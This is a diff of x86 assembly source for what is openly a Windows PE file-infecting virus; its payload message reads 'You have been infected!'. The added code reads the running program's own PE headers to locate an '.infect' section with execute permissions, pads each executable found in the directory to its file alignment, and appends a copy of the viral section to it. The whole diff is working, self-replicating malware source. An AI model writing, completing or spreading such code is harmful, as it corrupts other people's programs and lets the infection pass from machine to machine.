@@ -1,7 +1,7 @@
 include misc.inc
 
 .code
-old_entry:
+exit:
     invoke ExitProcess, 0
 
 inject SEGMENT read write execute
@@ -26,9 +26,20 @@ inject SEGMENT read write execute
 	strCaption db 'Notice', 0
     strContent db 'You have been infected!', 0
     
+    ishName db '.infect', 0 ; 8 bytes in length
+    ishVirtualSize dd 0
+    ishVirtualAddress dd 0
+    ishSizeOfRawData dd 0
+    ishPointerToRawData dd 0
+    ishPointerToRelocations dd 0
+    ishPointerToLineNumbers dd 0
+    ishNumberOfRelocations dw 0
+    ishNumberOfLinenumbers dw 0
+    ishCharacteristics dd 60000060h
+    ; IMAGE_SCN_CNT_CODE | IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ
+	; 0x00000020 | 0x00000040 | 0x20000000 | 0x40000000
+    
     ; .data?
-;    tempByte db 0
-;    tempWord db 0
     tempDword dd 0
     tempDword2 dd 0
     filePath db 260 DUP(0) ; filePath[MAX_PATH]
@@ -141,6 +152,42 @@ start:
 	    	80h, 			; FILE_ATTRIBUTE_NORMAL
 	    	0
 	toStack selfHand
+	
+	; Find inject section header of current file
+	getval fromStack(selfHand), 4, SEEK_SET, 3Ch
+	mov ebx, vaccess(tempDword) ; ebx = e_lfanew
+	mov eax, ebx
+	add eax, 6
+	getval fromStack(selfHand), 2, SEEK_SET, eax
+	mov edx, vaccess(tempDword) ; edx = NumberOfSections
+	mov eax, ebx
+	add eax, 20
+	getval fromStack(selfHand), 2, SEEK_SET, eax
+	add ebx, vaccess(tempDword) ; ebx = SectionTable #1
+	mov daccess(filePath), 0
+	invoke fromStack(fseek), fromStack(selfHand), ebx, 0, SEEK_SET
+	section_header_loop:
+		invoke fromStack(fread),
+				fromStack(selfHand),
+				daccess(filePath),
+				40,
+				daccess(tempDword2),
+				0
+		mov esi, daccess(filePath)
+		mov edi, daccess(ishName)
+		mov ecx, 8
+		cld
+		repe cmpsb
+	jz section_header_found
+		
+		dec edx
+		cmp edx, 0
+	ja section_header_loop
+	
+	section_header_found:
+	toStack selfSizeOfRawData, vaccess(offset filePath + 16)
+	toStack selfPointerToRawData, vaccess(offset filePath + 20)
+	
     
     ; Find first file in directory
     push daccess(offset win32FindData)
@@ -219,24 +266,38 @@ start:
     
     invoke fromStack(fseek), fromStack(tgHand), 0, 0, SEEK_END
     
+    ; Pad end of file to match FileAlignment
     mov ebx, eax
     inc ebx
     closest	ebx, fromStack(FileAlignment)
     dec ebx
     sub eax, ebx
     mov daccess(tempDword), 0
-    pad_start:
-    invoke fromStack(fwrite), fromStack(tgHand), daccess(tempDword), 1, daccess(tempDword2), 0
+    pad_loop:
+		invoke fromStack(fwrite), fromStack(tgHand), daccess(tempDword), 1, daccess(tempDword2), 0
+		dec ecx
+		cmp ecx, 0
+    ja pad_loop
     
+    mov ecx, fromStack(selfSizeOfRawData)
+    invoke fromStack(fseek), fromStack(selfHand), fromStack(selfPointerToRawData), 0, SEEK_SET
+    copy_start:
+		cmp ecx, 320
+		jbe copy_end
+		invoke fromStack(fread), fromStack(selfHand), daccess(win32FindData), 320, daccess(tempDword2), 0
+		invoke fromStack(fwrite), fromStack(tgHand), daccess(win32FindData), 320, daccess(tempDword2), 0
+		sub ecx, 320
+    jmp copy_start
     
-    
-                             
+    copy_end:
+	    invoke fromStack(fread), fromStack(selfHand), daccess(win32FindData), ecx, daccess(tempDword2), 0
+		invoke fromStack(fwrite), fromStack(tgHand), daccess(win32FindData), ecx, daccess(tempDword2), 0
+		
+	
     nextFile:
     invoke fromStack(fclose), fromStack(tgHand)
     
-    invoke fromStack(ffind2),
-    		fromStack(fileHand),
-    		daccess(offset win32FindData)
+    invoke fromStack(ffind2), fromStack(fileHand), daccess(offset win32FindData)
     		
     cmp eax, 0
     jne openFile
